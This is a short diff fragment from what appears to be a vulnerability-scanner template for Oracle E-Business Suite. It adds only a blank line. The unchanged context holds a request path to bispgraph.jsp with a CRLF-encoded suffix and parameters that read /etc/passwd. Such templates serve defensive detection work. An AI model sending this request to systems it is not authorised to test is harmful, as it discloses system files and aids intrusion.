@@ -7,6 +7,7 @@ requests:
   - method: GET
     path:
       - "{{BaseURL}}/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/"
+
     matchers:
       - type: regex
         regex:
